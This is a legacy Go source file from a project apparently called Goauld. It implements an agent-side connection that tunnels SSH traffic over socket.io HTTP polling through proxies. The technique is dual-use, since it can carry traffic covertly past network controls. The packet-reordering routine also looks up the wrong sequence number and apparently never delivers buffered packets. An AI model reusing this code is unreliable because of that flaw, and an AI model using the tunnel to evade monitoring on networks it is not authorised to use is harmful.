package old

import (
	"Goauld/agent/agent"
	"Goauld/agent/proxy"
	"Goauld/common/log"
	socketio "Goauld/common/socket.io"
	"bytes"
	"fmt"
	sio "github.com/karagenc/socket.io-go"
	eio "github.com/karagenc/socket.io-go/engine.io"
	"github.com/quic-go/webtransport-go"
	"net"
	"nhooyr.io/websocket"
	"sync"
	"time"
)

type SSHTTPClientOld struct {
	socket sio.ClientSocket

	bufMutex           sync.Mutex
	currentBuffer      bytes.Buffer
	sentCounter        int64
	incomingCounter    int64
	incomingQueueMutex sync.Mutex
	nextPackets        map[int64]socketio.SsHttp
	incomingMessage    chan socketio.SsHttp
}

func (conn *SSHTTPClientOld) Read(b []byte) (int, error) {
	//func (conn *SSHTTPClientOld) Write(b []byte) (int, error) {
	//log.Trace().Msg("Read start")
	//defer log.Trace().Msg("Read end")
	conn.bufMutex.Lock()
	defer conn.bufMutex.Unlock()
	if conn.currentBuffer.Len() > 0 {
		return conn.currentBuffer.Read(b)
	}
	//select {
	/*case*/
	data := <-conn.incomingMessage
	conn.currentBuffer.Write(data.Data)
	return conn.currentBuffer.Read(b)
	//default:
	//	return 0, nil
	//}

}

func (conn *SSHTTPClientOld) Write(b []byte) (int, error) {
	//func (conn *SSHTTPClientOld) Read(b []byte) (int, error) {
	//log.Trace().Msg("Write start")
	//defer log.Trace().Msg("Write end")
	if conn.socket != nil && len(b) > 0 {
		data := socketio.SsHttp{
			Id:   agent.Get().Id,
			Data: b,
			Num:  conn.sentCounter,
		}
		//log.Trace().Msgf("Sent packet N° %d (%d)", conn.sentCounter, len(data.Data))
		conn.socket.Emit(socketio.SSHTTPEvent, data)
		conn.sentCounter++
		return len(b), nil
	}
	return 0, nil
}

func (conn *SSHTTPClientOld) Close() error {
	conn.socket.Disconnect()
	return nil
}

func (conn *SSHTTPClientOld) LocalAddr() net.Addr {
	return nil
}

func (conn *SSHTTPClientOld) RemoteAddr() net.Addr {
	return nil

}

func (conn *SSHTTPClientOld) SetDeadline(t time.Time) error {
	return nil
}

func (conn *SSHTTPClientOld) SetReadDeadline(t time.Time) error {
	return nil
}

func (conn *SSHTTPClientOld) SetWriteDeadline(t time.Time) error {
	return nil
}

func (conn *SSHTTPClientOld) Start() {

	conn.socket.Connect()
}

func NewSSHTTPConn() *SSHTTPClientOld {
	cfg := getEioConfig()
	url := agent.Get().SSHTTPUrl()
	manager := sio.NewManager(url, cfg)
	socket := manager.Socket("/", nil)
	conn := &SSHTTPClientOld{
		socket:             socket,
		bufMutex:           sync.Mutex{},
		currentBuffer:      bytes.Buffer{},
		sentCounter:        0,
		incomingCounter:    0,
		incomingQueueMutex: sync.Mutex{},
		nextPackets:        make(map[int64]socketio.SsHttp),
		incomingMessage:    make(chan socketio.SsHttp),
	}

	socket.OnConnect(func() {
		log.Trace().Msgf("[SSHTTPClientOld] connect to %s", url)
	})
	socket.OnConnectError(func(err any) {
		log.Trace().Err(fmt.Errorf("%v", err)).Msgf("[SSHTTPClientOld] Error connecting to %s", url)
	})

	socket.OnDisconnect(func(reason sio.Reason) {
		log.Trace().Msgf("[SSHTTPClientOld] disconnect with reason: %s", reason)

	})
	manager.OnError(func(err error) {
		log.Trace().Err(err).Msgf("[SSHTTPClientOld] Error connecting to %s", url)
	})
	manager.OnReconnect(func(attempt uint32) {
		log.Trace().Msgf("[SSHTTPClientOld] Reconnect to %s (Attempts %d)", url, attempt)
	})

	socket.OnEvent(socketio.SSHTTPEvent, func(sshData socketio.SsHttp) {
		conn.incomingQueueMutex.Lock()
		defer conn.incomingQueueMutex.Unlock()
		//log.Trace().Msgf("[SSHTTPClientOld] Received packet N°%d (%d)", sshData.Num, len(sshData.Data))
		//log.Trace().Msg("Receive packet start")
		//defer log.Trace().Msg("Receive packet end")
		if sshData.Num == -1 {
			return
		}
		conn.processIncomingMessage(sshData)
	})
	return conn
}

func (conn *SSHTTPClientOld) processIncomingMessage(data socketio.SsHttp) {
	if conn.incomingCounter == data.Num {
		conn.incomingMessage <- data
		conn.incomingCounter++
		for {
			if next, ok := conn.nextPackets[data.Num]; ok {
				conn.incomingMessage <- next
				delete(conn.nextPackets, data.Num)
				conn.incomingCounter++
			} else {
				break
			}
		}
	} else if data.Num > conn.incomingCounter {
		conn.nextPackets[data.Num] = data
	}
}

func getEioConfig() *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			Transports:    []string{"polling"},
			HTTPTransport: proxy.NewTransportProxy(),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: proxy.NewHttpClientProxy(),
			},
			WebTransportDialer: &webtransport.Dialer{
				TLSClientConfig: proxy.NewTlsConfig(),
			},
		},
	}
}
